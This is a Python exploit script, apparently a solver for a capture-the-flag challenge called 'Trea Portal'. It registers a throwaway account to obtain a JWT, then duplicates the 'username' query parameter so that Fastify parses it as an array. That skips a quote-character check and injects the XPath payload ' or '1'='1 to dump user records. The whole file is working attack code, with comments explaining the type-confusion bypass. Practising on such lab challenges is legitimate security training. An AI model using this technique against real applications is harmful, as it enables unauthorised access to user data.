#!/usr/bin/env python3
# Trea Portal solver - XPath injection via query param type confusion
# Usage: python solver.py http://target:port

import sys
import random
import string
import requests
from urllib.parse import quote

def rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} http://target:port")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")

    # 1. Register a normal user to get a JWT
    user = rand()
    email = f"{user}@trea.htb"
    print(f"[*] Registering {user} <{email}>...")
    r = requests.post(f"{base}/api/auth/register", json={
        "username": user,
        "email": email,
        "password": "password123"
    })
    print(f"    status: {r.status_code}")
    print(f"    resp  : {r.text}")

    if r.status_code != 200:
        print("[-] Registration failed")
        sys.exit(1)
    jwt = r.json()["jwt"]
    print(f"[+] JWT: {jwt[:40]}...")

    # 2. Exploit: duplicate username query param -> Fastify turns it into an array
    #    -> typeof check skipped -> array.includes("'") is false -> XPath injected
    payload = "' or '1'='1"
    url = f"{base}/api/user?username=admin&username={quote(payload, safe='')}"
    print(f"[*] Sending payload: {url}")

    r = requests.get(url, headers={"Authorization": f"Bearer {jwt}"})
    print(f"    status: {r.status_code}")
    print(f"    resp  : {r.text}")

if __name__ == "__main__":
    main()
